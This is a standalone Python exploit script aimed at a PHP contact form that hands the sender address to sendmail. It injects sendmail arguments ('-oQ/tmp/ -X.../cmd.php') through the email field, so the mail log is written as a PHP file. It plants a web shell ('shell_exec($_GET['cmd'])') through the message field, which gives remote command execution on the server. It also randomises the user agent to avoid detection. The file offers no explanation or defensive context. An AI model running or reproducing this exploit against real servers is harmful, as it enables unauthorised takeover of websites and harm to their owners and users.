#!/usr/bin/python3
import requests
import urllib3
import os
import sys
import argparse
from urllib.parse import urlparse
from random_useragent.random_useragent import Randomize     # Randomize useragent

# Disable cert warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Set timeout
timeout = 10

# Handle CTRL-C
def keyboard_interrupt():
    """Handles keyboardinterrupt exceptions"""
    print("\n\n[*] User requested an interrupt, exiting...")
    exit(0)

# Custom headers
def http_headers():
    # Randomize useragent
    useragent = Randomize().random_agent('desktop', 'windows')
    headers = {
        'User-Agent': useragent,
    }
    return headers

# Check if URL is an URL
def isurl(urlstr):
    try:
        urlparse(urlstr)
        return urlstr
    except ArgumentTypeError:
        raise argparse.ArgumentTypeError("Invalid URL")

def gen_payload(writable_dir):
    payload = "\"attack\\\" -oQ/tmp/ -X" + writable_dir + "/cmd.php nospam\"@nowhere.com"
    return payload

def do_request(target_url,proxies,headers,payload,php_code):
    params = {'action':'submit',
            'name':'somename',
            'email':payload,
            'subject':'HELLO!',
            'message':php_code}
    r = requests.post(target_url,data=params,headers=headers,timeout=timeout,allow_redirects=False,verify=False,proxies=proxies)

# Main
def main(argv):
    parser = argparse.ArgumentParser(description='Python Web Template')
    parser.add_argument("--writedir", "-rw", required=True, help="The url of the target.")
    parser.add_argument("--url", "-u", type=isurl, required=True, help="The url of the target.")
    parser.add_argument("--proxy", "-p", type=isurl, required=False, help="Example: http://127.0.0.1:8080")
    args = parser.parse_args()
    
    # Check if target URL is valid
    url_parts = urlparse(args.url)
    target_url = "%s://%s%s" % (url_parts.scheme, url_parts.netloc, url_parts.path)

    # Set optional proxy
    proxies = {}
    if(args.proxy != None):
        proxy_parts = urlparse(args.proxy)
        proxies = {
            "http": "http://" + proxy_parts.netloc,
            "https": "https://" + proxy_parts.netloc,
        }            

    # Set other vars
    writeable_dir = args.writedir
    php_code = "<?php echo shell_exec($_GET['cmd']); exit; ?>"

    # Set HTTP Headers
    headers = http_headers()

    # Do stuff
    try:
        payload = gen_payload(writeable_dir)
        do_request(target_url,proxies,headers,payload,php_code)
    except requests.exceptions.Timeout:
        print("[!] Timeout error\n")
        exit(-1)
    except requests.exceptions.TooManyRedirects:
        print("[!] Too many redirects\n")
        exit(-1)
    except requests.exceptions.ConnectionError:
        print("[!] Not able to connect to URL\n")
        exit(-1)
    except requests.exceptions.RequestException as e:
        print("[!] " + str(e))
        exit(-1)
    except requests.exceptions.HTTPError as e:
        print("[!] Failed with error code - " + e.code + "\n")
        exit(-1)
    except KeyboardInterrupt:
        keyboard_interrupt()

# If we were called as a program, go execute the main function.
if __name__ == "__main__":
    main(sys.argv[1:])
